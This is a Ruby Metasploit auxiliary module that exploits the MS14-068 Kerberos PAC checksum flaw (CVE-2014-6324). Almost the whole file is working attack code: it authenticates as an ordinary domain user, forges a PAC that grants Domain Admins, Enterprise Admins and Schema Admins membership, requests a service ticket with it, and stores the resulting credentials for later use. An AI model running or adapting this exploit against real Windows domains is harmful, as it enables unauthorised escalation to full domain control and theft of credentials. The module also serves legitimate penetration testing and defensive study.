##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::Kerberos::Client

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'MS14-068 Microsoft Kerberos Checksum Validation Vulnerability',
        'Description' => %q{
          This module exploits a vulnerability in the Microsoft Kerberos implementation. The problem
          exists in the verification of the Privilege Attribute Certificate (PAC) from a Kerberos TGS
          request, where a domain user may forge a PAC with arbitrary privileges, including
          Domain Administrator. This module requests a TGT ticket with a forged PAC and exports it to
          a MIT Kerberos Credential Cache file. It can be loaded on Windows systems with the Mimikatz
          help. It has been tested successfully on Windows 2008.
        },
        'Author' => [
          'Tom Maddock', # Vulnerability discovery
          'Sylvain Monne', # pykek framework and exploit
          'juan vazquez' # Metasploit module
        ],
        'References' => [
          ['CVE', '2014-6324'],
          ['MSB', 'MS14-068'],
          ['OSVDB', '114751'],
          ['URL', 'http://blogs.technet.com/b/srd/archive/2014/11/18/additional-information-about-cve-2014-6324.aspx'],
          ['URL', 'https://labs.mwrinfosecurity.com/blog/2014/12/16/digging-into-ms14-068-exploitation-and-defence/'],
          ['URL', 'http://web.archive.org/web/20180107213459/https://github.com/bidord/pykek'],
          ['URL', 'https://www.rapid7.com/blog/post/2014/12/25/12-days-of-haxmas-ms14-068-now-in-metasploit']
        ],
        'License' => MSF_LICENSE,
        'DisclosureDate' => '2014-11-18',
        'Notes' => {
          'AKA' => ['ESKIMOROLL'],
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        OptString.new('USERNAME', [ true, 'The Domain User' ], aliases: ['USER']),
        OptString.new('PASSWORD', [ true, 'The Domain User password' ]),
        OptString.new('DOMAIN', [ true, 'The Domain (upper case) Ex: DEMO.LOCAL' ]),
        OptString.new('USER_SID', [ true, 'The Domain User SID, Ex: S-1-5-21-1755879683-3641577184-3486455962-1000'])
      ]
    )
  end

  def run
    print_status('Validating options...')

    unless datastore['USER_SID'] =~ /^S-(\d+-){6}\d+$/
      print_error('Invalid USER_SID. Ex: S-1-5-21-1755879683-3641577184-3486455962-1000')
      return
    end

    domain = datastore['DOMAIN'].upcase

    print_status("Using domain #{domain}...")

    user_sid_arr = datastore['USER_SID'].split('-')
    domain_sid = user_sid_arr[0, user_sid_arr.length - 1].join('-')
    user_rid = user_sid_arr[user_sid_arr.length - 1].to_i

    checksum_type = Rex::Proto::Kerberos::Crypto::Checksum::RSA_MD5
    etype = Rex::Proto::Kerberos::Crypto::Encryption::RC4_HMAC
    encryptor = Rex::Proto::Kerberos::Crypto::Encryption.from_etype(etype)
    password_digest = encryptor.string_to_key(datastore['PASSWORD'])

    pre_auth = []
    pre_auth << build_as_pa_time_stamp(key: password_digest, etype: etype)
    pre_auth << build_pa_pac_request

    print_status("#{peer} - Sending AS-REQ...")
    res = send_request_as(
      client_name: datastore['USERNAME'].to_s,
      server_name: "krbtgt/#{domain}",
      realm: domain.to_s,
      key: password_digest,
      pa_data: pre_auth,
      etype: [etype]
    )

    unless res.msg_type == Rex::Proto::Kerberos::Model::AS_REP
      print_warning("#{peer} - #{warn_error(res)}") if res.msg_type == Rex::Proto::Kerberos::Model::KRB_ERROR
      print_error("#{peer} - Invalid AS-REP, aborting...")
      return
    end

    print_status("#{peer} - Parsing AS-REP...")

    session_key = extract_session_key(res, password_digest)
    logon_time = extract_logon_time(res, password_digest)
    ticket = res.ticket

    pre_auth = []
    pre_auth << build_pa_pac_request

    groups = [
      Rex::Proto::Kerberos::Pac::DOMAIN_ADMINS,
      Rex::Proto::Kerberos::Pac::DOMAIN_USERS,
      Rex::Proto::Kerberos::Pac::SCHEMA_ADMINISTRATORS,
      Rex::Proto::Kerberos::Pac::ENTERPRISE_ADMINS,
      Rex::Proto::Kerberos::Pac::GROUP_POLICY_CREATOR_OWNERS
    ]

    pac = build_pac(
      client_name: datastore['USER'],
      group_ids: groups,
      domain_id: domain_sid,
      user_id: user_rid,
      realm: domain,
      logon_time: logon_time,
      checksum_type: checksum_type
    )

    auth_data = build_pac_authorization_data(pac: pac)
    sub_key = build_subkey(subkey_type: etype)

    print_status("#{peer} - Sending TGS-REQ...")

    res = send_request_tgs(
      client_name: datastore['USER'],
      server_name: "krbtgt/#{domain}",
      realm: domain,
      session_key: session_key,
      ticket: ticket,
      auth_data: auth_data,
      pa_data: pre_auth,
      subkey: sub_key
    )

    unless res.msg_type == Rex::Proto::Kerberos::Model::TGS_REP
      print_warning("#{peer} - #{warn_error(res)}") if res.msg_type == Rex::Proto::Kerberos::Model::KRB_ERROR
      print_error("#{peer} - Invalid TGS-REP, aborting...")
      return
    end

    print_good("#{peer} - Valid TGS-Response, extracting credentials...")

    cache = extract_kerb_creds(res, sub_key.value)
    Msf::Exploit::Remote::Kerberos::Ticket::Storage.store_ccache(cache, framework_module: self, host: rhost)
  end

  def warn_error(res)
    res.error_code.to_s
  end
end
